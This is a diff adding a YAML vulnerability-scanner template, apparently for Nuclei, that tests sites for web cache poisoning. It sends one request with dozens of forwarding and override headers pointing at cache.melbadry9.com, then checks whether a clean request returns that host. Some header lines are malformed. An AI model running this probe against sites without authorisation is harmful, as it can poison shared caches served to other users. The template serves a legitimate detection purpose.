@@ -1,0 +1,65 @@
+id: header-check
+info:
+  name: Cache Poisoning
+  author: melbadry9 & xelkomy
+  severity: low
+
+requests:
+  - raw:
+      - |
+        GET /?mel=9 HTTP/1.1
+        X-Forwarded-Prefix: cache.melbadry9.com
+        X-Forwarded-Host: cache.melbadry9.com
+        X-Forwarded-For: cache.melbadry9.com
+        X-For: cache.melbadry9.com
+        X-Force-Mobile: cache.melbadry9.com
+        X-Format: cache.melbadry9.com
+        x-forwarded: cache.melbadry9.com
+        x-forwarded-by: cache.melbadry9.com
+        x -forwarded-for: cache.melbadry9.com
+        x-forwarded-for-original: cache.melbadry9.com
+        x-forwarded-host: cache.melbadry9.com
+        X_FORWARDED_HOST: cache.melbadry9.com
+        X-Forwarded-IP: cache.melbadry9.com
+        x-forwarded-port: cache.melbadry9.com
+        x-forwarded-protocol: cache.melbadry9.com
+        x-forwarded-scheme: cache.melbadry9.com
+        x-forwarded-server: cache.melbadry9.com
+        X-Forwarded-Server-WA: cache.melbadry9.com
+        x-forwarded-ssl: cache.melbadry9.com
+        X-Forwarded-URI: cache.melbadry9.com
+        X-Forwarded-User: cache.melbadry9.com
+        Content-Accept: cache.melbadry9.com
+        content-type: cache.melbadry9.com
+        Content-ID: cache.melbadry9.com
+        
+        context-path
+        user: cache.melbadry9.com
+        
+        user-agent: cache.melbadry9.com
+        user-agent-via: cache.melbadry9.com
+        Fastly-Host: cache.melbadry9.com
+        Fastly-Orig-Accept-Encoding: cache.melbadry9.com
+        Fastly-Orig-Host: cache.melbadry9.com
+        Fastly-Region: cache.melbadry9.com
+        Fastly-Restarts: cache.melbadry9.com
+        fastly-soc-x-request-id: cache.melbadry9.com
+        fastly-ssl: cache.melbadry9.com
+        x-original-host: cache.melbadry9.com
+        x-origin: cache.melbadry9.com
+        x-original-url: cache.melbadry9.com
+        x-original-host: cache.melbadry9.com
+        authorization: cache.melbadry9.com
+        handle: cache.melbadry9.com
+        x-forwarded-proto: cache.melbadry9.com
+        x-http-method-override: cache.melbadry9.com
+        x-amz-website-redirect-location: cache.melbadry9.com
+
+      - |
+        GET /?mel=9 HTTP/1.1
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, "cache.melbadry9.com") == true'
